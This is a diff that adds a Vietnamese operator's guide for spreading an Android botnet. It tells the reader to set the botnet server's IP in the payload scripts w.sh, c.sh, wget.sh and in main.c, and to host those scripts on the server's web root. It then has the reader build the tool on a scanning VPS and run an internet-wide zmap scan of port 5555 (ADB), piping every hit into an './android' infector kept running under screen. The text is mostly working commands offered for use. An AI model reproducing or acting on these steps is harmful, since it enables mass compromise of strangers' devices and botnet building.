@@ -1,0 +1,19 @@
+hướng dẫn scan bots android
+
+sửa địa chỉ ipv4 của server botnet trong 3 file w.sh và c.sh và wget.sh trong thư mục android/upload/
+và main.c trên dòng 211 trong thư mục android/src/
+sau đó đặt 3 file w.sh và c.sh và wget.sh vào /var/www/html của server botnet
+nén toàn bộ file trong thư mục android thành android.zip và cho vào vps scan
+
+bây giờ hãy truy cập server scan và chạy các lệnh này
+yum install unzip -y
+yum install screen -y
+giải nén file android.zip ở /root
+unzip android.zip
+yum install epel-release -y 
+yum install zmap -y 
+yum install gcc gcc-c++ -y 
+sh build.sh
+tạo 1 fils scan.sh rùi copy lệnh này vào trong để treo
+ulimit -n 999999;ulimit -u999999; zmap -p 5555 -o- -q -v0 -T3 | awk {'print $1":5555"'} | ./android
+rồi chạy file bằng lệnh screen sh scan.sh
